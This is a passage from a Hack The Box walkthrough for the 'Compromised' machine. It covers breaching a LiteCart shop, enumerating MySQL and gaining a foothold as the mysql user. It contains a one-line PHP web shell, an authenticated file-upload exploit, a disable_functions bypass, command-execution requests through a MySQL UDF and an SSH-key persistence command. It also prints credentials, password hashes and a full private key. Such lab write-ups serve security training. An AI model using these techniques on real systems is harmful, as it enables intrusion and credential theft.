# HTB - Compromised

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

#### Useful thing 1

- description with generic example

#### Useful thing 2

- description with generic example

## Enumeration

### Nmap scan


I started my enumeration with an nmap scan of `10.10.10.207`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.

```
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ nmap -sCV -n -p- -Pn -v 10.10.10.207
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 15:53 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Initiating NSE at 15:53
Completed NSE at 15:53, 0.00s elapsed
Initiating Connect Scan at 15:53
Scanning 10.10.10.207 [65535 ports]
Discovered open port 22/tcp on 10.10.10.207
Discovered open port 80/tcp on 10.10.10.207
Connect Scan Timing: About 17.81% done; ETC: 15:56 (0:02:23 remaining)
Connect Scan Timing: About 37.26% done; ETC: 15:56 (0:01:43 remaining)
Connect Scan Timing: About 64.86% done; ETC: 15:56 (0:00:49 remaining)
Connect Scan Timing: About 80.09% done; ETC: 15:56 (0:00:32 remaining)
Completed Connect Scan at 15:56, 142.43s elapsed (65535 total ports)
Initiating Service scan at 15:56
Scanning 2 services on 10.10.10.207
Completed Service scan at 15:56, 5.01s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.207.
Initiating NSE at 15:56
Completed NSE at 15:57, 60.01s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 2.01s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Nmap scan report for 10.10.10.207
Host is up (0.0000020s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped

NSE: Script Post-scanning.
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Initiating NSE at 15:57
Completed NSE at 15:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.64 seconds
```

Only two ports open, 22 - SSH, and 80 - HTTP

Website selling rubber duckies on port 80; `LiteCart` need to find version to see if vulnerabilities

admin@compromised.htb

No SQL injection, 

`/backup` contained a zip file `a.tar.gz`

```
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ tar -xvf a.tar.gz       
shop/
shop/.htaccess
shop/index.php
shop/images/
---snipped---
shop/admin/
shop/admin/pages.app/
shop/admin/pages.app/edit_page.inc.php
shop/admin/pages.app/pages.inc.php
shop/admin/pages.app/csv.inc.php
shop/admin/pages.app/config.inc.php
shop/admin/pages.app/index.html
shop/admin/index.php
shop/admin/catalog.app/
---snipped---
shop/pages/product.inc.php
shop/pages/feeds/
shop/pages/feeds/sitemap.xml.inc.php
shop/pages/feeds/index.html
shop/pages/order_success.inc.php
shop/pages/information.inc.php
shop/pages/checkout.inc.php
shop/pages/search.inc.php
shop/pages/order_process.inc.php
shop/pages/login.inc.php
shop/pages/edit_account.inc.php
shop/pages/categories.inc.php
shop/pages/category.inc.php
shop/pages/customer_service.inc.php
shop/pages/manufacturer.inc.php
shop/pages/order_history.inc.php
shop/pages/index.inc.php
shop/pages/logout.inc.php
shop/pages/maintenance_mode.inc.php
shop/pages/reset_password.inc.php
shop/pages/error_document.inc.php
shop/pages/printable_order_copy.inc.php
shop/pages/regional_settings.inc.php
shop/pages/create_account.inc.php
shop/pages/index.html
shop/pages/push_jobs.inc.php
shop/data/
shop/data/.htaccess
shop/data/blacklist.txt
shop/data/whitelist.txt
shop/data/bad_urls.txt
shop/data/captcha.ttf
shop/data/index.html

---snipped---
shop/.sh.php
shop/cache/
shop/cache/_cache_admin_apps_87e4038035a3612d72f7dc0e4db1f249
shop/cache/.htaccess
shop/cache/_cache_box_category_tree_348b1f1e075668ac7ea3d7cc1a70d131
shop/cache/c548260d44e24d535ba3fccc3c43ba05c7ed93f9_320x320_fwb.jpg
shop/cache/_cache_box_slides_7acb161bbf88c2463889776217f40405
shop/cache/_cache_translations_08fb7a76fe9889c7229e347fc365572b
shop/cache/583f8673ff92f9fd4c20ec8b1efe1d33c0002251_320x320_fwb.jpg
shop/cache/_cache_links_4af2ac3a6155900f3489935658237ccc
shop/cache/6de25837a78f9006034e2ebcde4f92c5a9423e0e_320x320_fwb.jpg
shop/cache/3a3f11dade5b8735b32347d7c72635cd36dfc6ee_640x640_fwb.jpg
shop/cache/_cache_box_site_footer_3cfe8cf07afa30c7ded728480aa1c4a0
shop/cache/c5515f64d0a81ec44e9546d16d45997424b22830_0x60_f.png
shop/cache/_cache_admin_widgets_7e6025d3c49df3bb009befb1e7d11de7
shop/cache/_cache_translations_a5cffc86b04ab3f12f6c4bbcc7089c0a
shop/cache/c548260d44e24d535ba3fccc3c43ba05c7ed93f9_640x640_fwb.jpg
shop/cache/83bc2f1a42a15397099d43cb6485bd45fbc94701_320x320_fwb.jpg
shop/cache/_cache_box_latest_products_3525edd76b7337df655e2836de07dae6
shop/cache/_cache_box_site_menu_927c4e77d649c0caf82035ca4a2deae5
shop/cache/_cache_box_manufacturer_logotypes_09265003c2d15fc1f6b0585970484255
shop/cache/c5515f64d0a81ec44e9546d16d45997424b22830_0x30_f.png
shop/cache/_cache_widget_discussions_8b2f549ef58aea26d2e520c67c774ec6
shop/cache/_cache_widget_addons_a0c61a130a70a3f9a268e4de8ceefed7
shop/cache/3a3f11dade5b8735b32347d7c72635cd36dfc6ee_320x320_fwb.jpg
shop/cache/6de25837a78f9006034e2ebcde4f92c5a9423e0e_640x640_fwb.jpg
shop/cache/_cache_box_campaign_products_12a69b81ba2893c250481876b44689ef
shop/cache/83bc2f1a42a15397099d43cb6485bd45fbc94701_640x640_fwb.jpg
shop/cache/_cache_box_popular_products_ae023d8d43ee40f30f421b5074672c14
shop/cache/_cache_widget_graphs_ac212c15101de56b09819c0fc75e10c8
shop/cache/_cache_links_3416e6563a45c12fd74c3f251f5c0368
shop/cache/583f8673ff92f9fd4c20ec8b1efe1d33c0002251_640x640_fwb.jpg
shop/cache/index.html
shop/cache/4f7c546191e44cdaa756f2794c7cb01451ab17bb_24x24_c.png
shop/robots.txt
shop/favicon.ico
shop/ext/
---snipped---
shop/ext/index.html
```

It seemed like a backup of the whole filestructure of the site.  There definitely had to be some interesting information in here, but there was a lot to go through

It looked like the site had been compromised at some point, since there was a php backdoor included in the backup

```
┌──(zweilos㉿kali)-[~/htb/compromised/shop]
└─$ cat robots.txt                                  
User-agent: *
Allow: /
Disallow: */cache/*
Sitemap: /feeds/sitemap.xml
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/compromised/shop]
└─$ cat .sh.php    
<?php system($_REQUEST['cmd']); ?>
```

The `robots.txt` and `sitemap.xml` did not exist on the live site, perhaps they were removed after the site was compromised?

```
                                                                                                        
┌──(zweilos㉿kali)-[~/htb/compromised/shop/admin]
└─$ grep -r pass                                                                 
admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```

The `/admin` folder looked like a good place to start searching.  I did a search for passwords in the files, and the login page of the admin folder contained a reference to a log file that usernames and passwords were being written to

```
┌──(zweilos㉿kali)-[~/htb/compromised/shop/admin]
└─$ ls -la
total 116
drwxr-xr-x 24 zweilos zweilos 4096 Sep  3 07:50 .
drwxr-xr-x 11 zweilos zweilos 4096 May 28  2020 ..
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 addons.widget
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 appearance.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 catalog.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 countries.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 currencies.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 customers.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 discussions.widget
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 geo_zones.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 graphs.widget
-rw-r--r--  1 zweilos zweilos 6460 May 14  2018 index.php
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 languages.app
-rw-r--r--  1 zweilos zweilos 1364 Sep  3 07:50 login.php
-rw-r--r--  1 zweilos zweilos  203 May 14  2018 logout.php
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 modules.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 orders.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 orders.widget
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 pages.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 reports.app
-rw-r--r--  1 zweilos zweilos 4094 May 14  2018 search_results.json.php
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 settings.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 slides.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 stats.widget
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 tax.app
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 translations.app
drwxr-xr-x  2 zweilos zweilos 4096 May 28  2020 users.app
drwxr-xr-x  2 zweilos zweilos 4096 May 28  2020 vqmods.app
```

The file `login.php` had been modified more recently than everything else here, perhaps to comment out that line


```
┌──(zweilos㉿kali)-[~/htb/compromised/shop/includes]
└─$ ls -la
total 80
drwxr-xr-x 11 zweilos zweilos 4096 May 28  2020 .
drwxr-xr-x 11 zweilos zweilos 4096 May 28  2020 ..
-rw-r--r--  1 zweilos zweilos 1955 May 14  2018 app_footer.inc.php
-rw-r--r--  1 zweilos zweilos  996 May 14  2018 app_header.inc.php
-rw-r--r--  1 zweilos zweilos 1808 May 14  2018 autoloader.inc.php
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 boxes
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 classes
-rw-r--r--  1 zweilos zweilos 6064 May 14  2018 compatibility.inc.php
-rw-r--r--  1 zweilos zweilos 9376 May 28  2020 config.inc.php
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 controllers
-rw-r--r--  1 zweilos zweilos 2537 May 14  2018 error_handler.inc.php
drwxr-xr-x  2 zweilos zweilos 4096 May 28  2020 functions
-rw-r--r--  1 zweilos zweilos    0 May 14  2018 index.html
drwxr-xr-x  2 zweilos zweilos 4096 Sep  3 07:49 library
drwxr-xr-x  8 zweilos zweilos 4096 May 14  2018 modules
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 references
drwxr-xr-x  2 zweilos zweilos 4096 May 14  2018 routes
drwxr-xr-x  4 zweilos zweilos 4096 May 14  2018 templates
```

The `/includes/library` folder had also been modified on Sep 3

```
┌──(zweilos㉿kali)-[~/…/compromised/shop/includes/library]
└─$ ls -la
total 200
drwxr-xr-x  2 zweilos zweilos  4096 Sep  3 07:49 .
drwxr-xr-x 11 zweilos zweilos  4096 Dec 26 18:26 ..
-rw-r--r--  1 zweilos zweilos     0 May 14  2018 index.html
-rw-r--r--  1 zweilos zweilos  1372 May 14  2018 lib_breadcrumbs.inc.php
-rw-r--r--  1 zweilos zweilos  9237 May 14  2018 lib_cache.inc.php
-rw-r--r--  1 zweilos zweilos 15785 May 14  2018 lib_cart.inc.php
-rw-r--r--  1 zweilos zweilos   297 May 14  2018 lib_catalog.inc.php
-rw-r--r--  1 zweilos zweilos   890 May 14  2018 lib_compression.inc.php
-rw-r--r--  1 zweilos zweilos  8068 May 14  2018 lib_currency.inc.php
-rw-r--r--  1 zweilos zweilos 12441 May 14  2018 lib_customer.inc.php
-rw-r--r--  1 zweilos zweilos  6931 May 14  2018 lib_database.inc.php
-rw-r--r--  1 zweilos zweilos 11532 May 14  2018 lib_document.inc.php
-rw-r--r--  1 zweilos zweilos  1640 May 14  2018 lib_form.inc.php
-rw-r--r--  1 zweilos zweilos   379 May 14  2018 lib_functions.inc.php
-rw-r--r--  1 zweilos zweilos 12236 May 14  2018 lib_language.inc.php
-rw-r--r--  1 zweilos zweilos  2939 May 14  2018 lib_length.inc.php
-rw-r--r--  1 zweilos zweilos  7690 May 14  2018 lib_link.inc.php
-rw-r--r--  1 zweilos zweilos  2002 May 14  2018 lib_notices.inc.php
-rw-r--r--  1 zweilos zweilos  2787 May 14  2018 lib_reference.inc.php
-rw-r--r--  1 zweilos zweilos  8388 May 14  2018 lib_route.inc.php
-rw-r--r--  1 zweilos zweilos 10894 May 14  2018 lib_security.inc.php
-rw-r--r--  1 zweilos zweilos  2256 May 14  2018 lib_session.inc.php
-rw-r--r--  1 zweilos zweilos  2413 May 14  2018 lib_settings.inc.php
-rw-r--r--  1 zweilos zweilos  3508 May 14  2018 lib_stats.inc.php
-rw-r--r--  1 zweilos zweilos  7227 May 14  2018 lib_tax.inc.php
-rw-r--r--  1 zweilos zweilos  8317 Sep  3 07:49 lib_user.inc.php
-rw-r--r--  1 zweilos zweilos  4218 May 14  2018 lib_volume.inc.php
-rw-r--r--  1 zweilos zweilos  2371 May 14  2018 lib_weight.inc.php
```

Checking the files in this folder lead to `lib_user.inc.php`

```
includes/config.inc.php:  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
```

searching the rest of the folders found password hash in `includes/config.inc.php` This file also included possible database creds and names of all of the tables

```
┌──(zweilos㉿kali)-[~/htb/compromised/shop]
└─$ grep -ir .log2301c9430d8593ae.txt
admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
includes/library/lib_user.inc.php:      //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $username . " Passwd: " . $password);
```

Both files contained the same reference to this file, and both had been maodified on Sep 3

```
┌──(zweilos㉿kali)-[~/htb/compromised/shop]
└─$ find . -newermt "Sep 3"              
./admin
./admin/login.php
./admin/users.app
./includes
./includes/library
./includes/library/lib_user.inc.php
```

There were only a few files modified on that day; There were no files in `/admin/users.app/` that had been modified that day, so something had likely been deleted from there

The file contained credentials for an admin user `User: admin Passwd: theNextGenSt0r3!~`

Using these creds I tried to login to the admin page; after logging in I got an interesting message that said some thing of the sort: "The last time you logged in was at IP 10.10.14.27.  If this was not you your credentials may have been compromised".  Unfortunately the message disappeared before I could screenshot it.  There was also a banner that said that the admin account was not `.htpasswd` protected

I noticed in the bottom corner of the page that the version of LiteCart they were using was 2.1.2, so I looked up whether there were any known vulnerabiliteis associated with that version

* https://medium.com/@foxsin34/litecart-2-1-2-arbitrary-file-upload-authenticated-1b962df55a45
* https://www.exploit-db.com/exploits/45267

```python
'-t',
                    help='admin login page url - EX: https://IPADDRESS/admin/')
parser.add_argument('-p',
                    help='admin password')
parser.add_argument('-u',
                    help='admin username')
```

To use the exploit I needed to supply admin credentials, and the path of the admin login page.   Luckily I already had that information.  Sadly, the exploit was written in python2 so I had to do a bit of work to get it to run

https://stackoverflow.com/questions/8405096/python-3-2-cookielib

```
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ python3 litecart_exploit.py -t http://10.10.10.207/shop/admin -u admin -p 'theNextGenSt0r3!~'
Sorry something went wrong
```

hmmm...next I looked at the code in the python exploit and manually tried to exploit it.  

I was able to upload my web-shell and access it by disquising it as an xml file using burp, but I could not get any commands to run.  They would all time out, so I guessed there was a firewall or something blocking it

* https://www.thoughtco.com/what-version-of-php-running-2694207

I tried to get the version of PHP that the server was running using the `phpinfo()` method, and got back a ton of information from the server.  There was pages and pages of configuration and environment ifnomration about the server and the current running context. version 	7.2.24-0ubuntu0.18.04.6 

```php
system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
```

After looking closely through all of the output, I noticed that there was a section called "disabled functions" which held all of the methods of code execution that I knew of , and even some other interesting sounding php functions I didn't know of...but couldn't use here anyway

I searched for a possible vulnerability in this version of PHP to see if there was a way to re-enable functions or something like that and found

* https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable_functions-in-php-installations-6ccdbf4f52bb/
* https://www.netsparker.com/blog/web-security/bypass-disabled-system-functions/
* https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php
* https://www.sudokaikan.com/2019/10/bypass-disablefunctions-in-php-by-json.html
* https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php

The last one only works up to 7.2.19, 

* https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php

but there was another one from the same author that work up to 7.3; I modified the exploit POC to allow me to supply arbitrary commands, uploaded it, and tested it.



Success! I had code execution.  I was running in the context of `www-data`

Got `/etc/passwd` There were three users who could login: sysadmin, mysql, and root

Checked output of `ps aux` and noticed mysqld was running.  Perhaps I could enumerate the database since I had seen the tables and login information earlier

Found a way to execute shell commands using mysql

* https://electrictoolbox.com/run-single-mysql-query-command-line/
* https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html

If there was a way to do this, maybe from the command line too

`GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"show+tables"+ecom HTTP/1.1`

got code execution with `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"system+id"+ecom HTTP/1.1`

had to specify -e to execute SQL commands, system to run system commands, and had to end the line with the database name 'ecom'

Still executing commands as `www-data` however, need to figure out how to escalate privileges; Found an interesting thing in the mysql references that talks about user defined variables

> User-defined variables are session specific. A user variable defined by one client cannot be seen or used by other clients.

https://dev.mysql.com/doc/refman/8.0/en/performance-schema-user-defined-functions-table.html

There was also a section on user-defined functions

```
--------------
show tables
--------------

Tables_in_mysql
columns_priv
db
engine_cost
event
func
general_log
gtid_executed
help_category
help_keyword
help_relation
help_topic
innodb_index_stats
innodb_table_stats
ndb_binlog_index
plugin
proc
procs_priv
proxies_priv
server_cost
servers
slave_master_info
slave_relay_log_info
slave_worker_info
slow_log
tables_priv
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user
```

I started browsing through the `mysql` database

```
--------------
select * from user
--------------

Host	User	Select_priv	Insert_priv	Update_priv	Delete_priv	Create_priv	Drop_priv	Reload_priv	Shutdown_priv	Process_priv	File_priv	Grant_priv	References_priv	Index_priv	Alter_priv	Show_db_priv	Super_priv	Create_tmp_table_priv	Lock_tables_priv	Execute_priv	Repl_slave_priv	Repl_client_priv	Create_view_priv	Show_view_priv	Create_routine_priv	Alter_routine_priv	Create_user_priv	Event_priv	Trigger_priv	Create_tablespace_priv	ssl_type	ssl_cipher	x509_issuer	x509_subject	max_questions	max_updates	max_connections	max_user_connections	plugin	authentication_string	password_expired	password_last_changed	password_lifetime	account_locked
localhost	root	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y					0	0	0	0	mysql_native_password	*C890DD6B4A77DC26B05EB1EE1E458A3E374D3E5B	N	2020-05-09 02:15:14	NULL	N
localhost	mysql.session	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	Y	N	N	N	N	N	N	N	N	N	N	N	N	N					0	0	0	0	mysql_native_password	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE	N	2020-05-08 16:02:15	NULL	Y
localhost	mysql.sys	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N					0	0	0	0	mysql_native_password	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE	N	2020-05-08 16:02:15	NULL	Y
localhost	debian-sys-maint	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y					0	0	0	0	mysql_native_password	*7CDDF050D9C0BC9EB6FDFE3C9CBC1E5F852A9F7A	N	2020-05-08 16:02:16	NULL	N

```

Found the credentials for the root user for mysql

```
--------------
select * from func
--------------

name	ret	dl	type
exec_cmd	0	libmysql.so	function
```

There was one function stored in the `func` table in the `mysql` database

`GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('id')"+mysql HTTP/1.1`

From these results I could see that this function was running in the context of the user `mysql`.  Since I knew that this user could log in, I tried to insert my SSH public key into their `.ssh/authorized_keys` file so I could login usign SSH

`GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('echo+ecdsa-sha2-nistp256+AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLNqKR/rHfuv30j7eOmU85z%2bEKhPfUFtn9WEARBZzwF6LFTCgjZzqAF0GevT3b22Z5iqwETgfF%2bQcmjAw3Ld9VY%3d+>>+~/.ssh/authorized_keys')"+mysql HTTP/1.1`



## Initial Foothold

### Enumeration as `mysql`

```
┌──(zweilos㉿kali)-[~/htb/compromised]
└─$ ssh mysql@10.10.10.207 -i compromised.key                                                     130 ⨯
Last login: Thu Sep  3 11:52:44 2020 from 10.10.14.2
mysql@compromised:~$ id && hostname
uid=111(mysql) gid=113(mysql) groups=113(mysql)
compromised
mysql@compromised:~$ ls -la
total 189280
drwx------  9 mysql mysql     4096 Dec 25 05:48 .
drwxr-xr-x 43 root  root      4096 May 24  2020 ..
-rw-r-----  1 mysql mysql       56 May  8  2020 auto.cnf
lrwxrwxrwx  1 root  root         9 May  9  2020 .bash_history -> /dev/null
-rw-------  1 mysql mysql     1680 May  8  2020 ca-key.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 ca.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 client-cert.pem
-rw-------  1 mysql mysql     1676 May  8  2020 client-key.pem
-rw-r--r--  1 root  root         0 May  8  2020 debian-5.7.flag
drwxr-x---  2 mysql mysql    12288 May 28  2020 ecom
drwx------  3 mysql mysql     4096 May  9  2020 .gnupg
-rw-r-----  1 mysql mysql      527 Sep 12 19:57 ib_buffer_pool
-rw-r-----  1 mysql mysql 79691776 Dec 25 05:48 ibdata1
-rw-r-----  1 mysql mysql 50331648 Dec 25 05:48 ib_logfile0
-rw-r-----  1 mysql mysql 50331648 May 27  2020 ib_logfile1
-rw-r-----  1 mysql mysql 12582912 Dec 27 16:47 ibtmp1
drwxrwxr-x  3 mysql mysql     4096 May  9  2020 .local
drwxr-x---  2 mysql mysql     4096 May  8  2020 mysql
lrwxrwxrwx  1 root  root         9 May 13  2020 .mysql_history -> /dev/null
drwxr-x---  2 mysql mysql     4096 May  8  2020 performance_schema
-rw-------  1 mysql mysql     1680 May  8  2020 private_key.pem
-rw-r--r--  1 mysql mysql      452 May  8  2020 public_key.pem
-rw-r--r--  1 mysql mysql     1112 May  8  2020 server-cert.pem
-rw-------  1 mysql mysql     1680 May  8  2020 server-key.pem
drwxrwxr-x  2 mysql mysql     4096 Sep  3 11:52 .ssh
-r--r-----  1 root  mysql   787180 May 13  2020 strace-log.dat
drwxr-x---  2 mysql mysql    12288 May  8  2020 sys
mysql@compromised:~$ pwd
/var/lib/mysql
mysql@compromised:~$ cat /home/mysql/user.txt
cat: /home/mysql/user.txt: No such file or directory
mysql@compromised:~$ cd /home
mysql@compromised:/home$ ls -la
total 12
drwxr-xr-x  3 root root     4096 May 13  2020 .
drwxr-xr-x 24 root root     4096 Sep  9 12:02 ..
drwxr-x---  2 root sysadmin 4096 Aug 31 03:16 sysadmin
```

I was finally able to login as `mysql`, but there was no `user.txt` in site.  It looked like I needed to move laterally to `sysadmin` first

```
mysql@compromised:~$ cat private_key.pem 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqTt5K2NQkYThnQvJNka1k5tHjVOh6ZhdN5k4ThY9V3Fhq1MI
Zl6sJPMLI/Ub9Xwjn1Ucyxs+P0h5kk8Ozx/EnXVmJBemkTBgpakh5NNf8MAhkpmn
Ng/jc/T1AUmq8lgt3+2X/5TnvH/DWape8f1TmnCCmIzBGUUKzdD+K+ojNq/Ii3JI
WVxm3o/HxerQHwmrc7rEtLOQIKym7rRF5tMrdhacoOFkxSsvO7/juAdfv941yl4d
7Q8kOtmd2R4XO8d8CLEjcyiSC1SJ8nfd3pvjIoxeKFRETgbSZHTcxUbhREjaBzms
kWB3w3Gij+y+BefUAqCX5F1+OCtGMFoBahHCHQIDAQABAoIBAQCAbNepK3cK13J3
QWhyvfoxh9cm0t6+bJfhB2+JIqtuXmamIx7uwM2WRLKhmPKcupY15dsx7vyv/Yn0
k/ZDDHKio2Ld5OzMpY/SZ6WHBzl5c/SGUgBosGoFp1D+py8JNg2qL533oMKzc6mF
tBrVPU9ilhslNTuct55ZTk50ePw8FLIJHIpd7Ng2Z1oVGUKz1WXmZoVhnxPCxYSQ
smkWKQuSoykWfaOZ7mGev64e/O4jsq4CQvo2MI89cXLW4N5tfBJZvGelN4kylEM/
55T7Mmy5P4R6fzc9/auMTktIERh9m3St7EvtRApqLH3otZXG1vnesYoWK5yUltBG
z0RZT7VpAoGBANIRMWcg5DiDu5nG/ijuRp3CNChbMdXQvmQnCv0MVchnQ3Pr9MUT
n/J9hL+EBYRxJL1O7Mer/UanX/eVMT14/JNDaaR1uOVVwWUKKh3lKNDBF4cyT4cu
pVL+dm7NElkoNYuLzJPXM/DvyWfIqKC2/9AVcPvvNouFVivJJh4W05kfAoGBAM48
ff4AmpM/VXAy+mhtjVDwnstVj738/U4P19lTytidkX13IaGPIOpL+RXxA4dm5HPq
sXXqNXfAIV7RZbxBGLfMpX2PmwYWfhT7Bo6YwPkEHMzcnNMgZ9dzHtmUMyt+i47r
l8ouL5NYGDx7K3S9UFa/5v8GkouLQI4zXE9ApnFDAoGAZSnEed68KX8/NCJBueJt
/YFN7vVj/Y1GcyLeRtjO4vDf6g6C1PnLeFL8P+LLaWm3gLdmjg4Eribir2+Yw/rk
3+KCGKJcxYzT0t3fRIBcdJPYydHvvLE5Csviqx91K5ySlL5haf0kVW6UtrdKhgM7
FLGOtLURtoUi53k6MxlZE48CgYApohCVLC4IN6rZwZDHcAYtJsYHqjggVGgWUCB0
4PN8EyMBvwDtCmXMppWcFlFuDhlkRSaZ9TPh/sk9yOvOux1wTUHDPTBAZF4DgkFq
m++o1Wmy+X43KL2NwtGhfsdtqlgl++1ihTxZdFlALGUzZdxIBuls5jjDLtNTYY7q
+NQg3QKBgQDO8jZA/ngqCrJdHhv7FmSck1URCwQMHY+2dW9+SFm9HfBojLxrsqCG
RdhLIsr3aqhRQhJmhdcwkXcXdNwHFZ1oKrVn/wljqZ3HyVIOl0Cqry8SOCx69T1k
kr4uBVfsyTeGWCgelq6x7avuTmMFVJn4iUX0czwbiqOOx1y0Fyliog==
-----END RSA PRIVATE KEY-----
```

I exfiltrated the private SSH key so I could log in as needed in the future;


### Finding user creds

```
mysql@compromised:~$ cat auto.cnf 
[auto]
server-uuid=4667b165-9145-11ea-aaf7-000c29fa914e
mysql@compromised:~$ cat strace-log.dat
```

 I wasnt sure what the strace.log was so I read up a bit

* https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/

> The strace tool intercepts and records any system calls (a.k.a.  syscalls) performed and any signals received by a traced process. It is excellent for complex troubleshooting, but beware, as it has a high-performance impact for the traced process.

* https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries

The file had a ton of output, so I filtered it for lines where mysql had been run

```
mysql@compromised:~$ cat strace-log.dat | mysql
ERROR 1045 (28000): Access denied for user 'mysql'@'localhost' (using password: NO)
mysql@compromised:~$ cat strace-log.dat | grep mysql
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
22227 03:11:09 stat("/etc/mysql/my.cnf", {st_mode=S_IFREG|0644, st_size=682, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/my.cnf", O_RDONLY) = 3
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22227 03:11:09 stat("/etc/mysql/conf.d/mysql.cnf", {st_mode=S_IFREG|0644, st_size=8, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/mysql.cnf", O_RDONLY) = 4
22227 03:11:09 read(4, "[mysql]\n", 4096) = 8
